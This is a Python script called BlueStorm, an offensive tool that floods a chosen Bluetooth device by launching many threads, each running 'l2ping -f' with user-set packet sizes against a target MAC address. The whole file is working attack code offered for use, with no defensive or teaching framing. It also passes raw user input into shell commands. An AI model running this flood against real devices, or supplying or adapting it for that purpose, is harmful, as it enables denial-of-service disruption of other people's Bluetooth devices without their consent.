# BlueStorm
# A tool which perform deauthentication attack on unpaired bluetooth devices.
# Author - WireBits

import os
import time
import threading
import subprocess

RED = '\033[91m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
RESET = '\033[0m'

def bluetooth_deauthentication(bluetooth_interface, packet_size, target_address):
    os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')

def logo():
    print(f"""
                {RED}  ....  {RESET}
                {RED} .-@@%-.{RESET}
                {RED} .-@@@@#:. {RESET}
                {RED} .-@@@@@@#. {RESET}
                {RED} .-@@+:#@@@*. {RESET}
                {RED} .-@@+. :%@@@+. {RESET}
        {RED} .:**:.  .-@@+.   -@@@@=. {RESET}
        {RED} .+@@@#. .-@@+.   .%@@@+. {RESET}
        {RED} .:#@@@#.-@@+. .#@@@#.. {RESET}                 {RED}╔╗ ╦  ╦ ╦╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗{RESET}
        {RED}    .:@@@@@@@+.*@@@%:. {RESET}                  {RED}╠╩╗║  ║ ║║╣ ╚═╗ ║ ║ ║╠╦╝║║║{RESET}
        {RED}      .:@@@@@@@@@@.. {RESET}                    {RED}╚═╝╩═╝╚═╝╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩{RESET}
        {RED}      .-@@@@@@-. {RESET}                       {RED}Bluetooth Deauthentication Tool{RESET}
        {RED}      .:@@@@@@:. {RESET}                     {RED}+---------------------------------+{RESET}
        {RED}      :@@@@@@@@@@. {RESET}                           {RED}Author : WireBits{RESET}
        {RED}    .:@@@@@@@+.#@@@%.. {RESET}
        {RED}  .:#@@@#.-@@+. .#@@@#.. {RESET}
        {RED} .+@@@%. .-@@+.   .%@@@+. {RESET}
        {RED} .:*#:.  .-@@+.   :@@@@=. {RESET}
        {RED}         .-@@+. :%@@@*. {RESET}
        {RED}         .-@@+:#@@@#. {RESET}
        {RED}         .-@@@@@@%. {RESET}
        {RED}         .-@@@@%:. {RESET}
        {RED}         .-@@%-. {RESET}
        {RED}          ....  {RESET}
    """)

def main():
    subprocess.check_output("sudo service bluetooth restart", shell=True, stderr=subprocess.STDOUT, text=True)
    os.system('clear')
    logo()
    print("")

    bluetooth_interface = input(f'{GREEN}[*]{RESET} {YELLOW}Bluetooth Interface (e.g. hci0){RESET} {CYAN}>{RESET} ')
    if not bluetooth_interface:
        print(f'{RED}[!]{RESET} {RED}Bluetooth Interface not entered!{RESET}')
        exit(0)

    target_address = input(f'{GREEN}[*]{RESET} {YELLOW}Target ID or MAC Address{RESET} {CYAN}>{RESET} ')
    if len(target_address) < 1:
        print(f'{RED}[!]{RESET} {RED}Target address not entered!{RESET}')
        exit(0)

    try:
        packet_size = int(input(f'{GREEN}[*]{RESET} {YELLOW}Packet Size (Max : 600){RESET} {CYAN}>{RESET} '))
    except ValueError:
        print(f'{RED}[!]{RESET} {RED}Packet size must be an integer!{RESET}')
        exit(0)

    try:
        threads_count = int(input(f'{GREEN}[*]{RESET} {YELLOW}Number of threads {RESET} {CYAN}>{RESET} '))
    except ValueError:
        print(f'{RED}[!]{RESET} {RED}Number of threads must be an integer!{RESET}')
        exit(0)

    print("")
    os.system('clear')

    for i in range(3, 0, -1):
        countdown_message = f"{GREEN}[*]{RESET} {YELLOW}Starting deauthentication attack in{RESET} {RED}{i}{RESET} {YELLOW}seconds...{RESET}"
        print(countdown_message, end='\r')
        time.sleep(1)
    os.system('clear')

    print(f'{GREEN}[*]{RESET} {YELLOW}Building threads...{RESET}')

    for _ in range(threads_count):
        threading.Thread(target=bluetooth_deauthentication, args=[bluetooth_interface, packet_size, target_address]).start()

    print(f'{GREEN}[*]{RESET} {YELLOW}Threads built!{RESET}')
    print(f'{GREEN}[*]{RESET} {YELLOW}Attack Started!{RESET}')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'{RED}[!]{RESET} {RED}Aborted!{RESET}')
        exit(0)
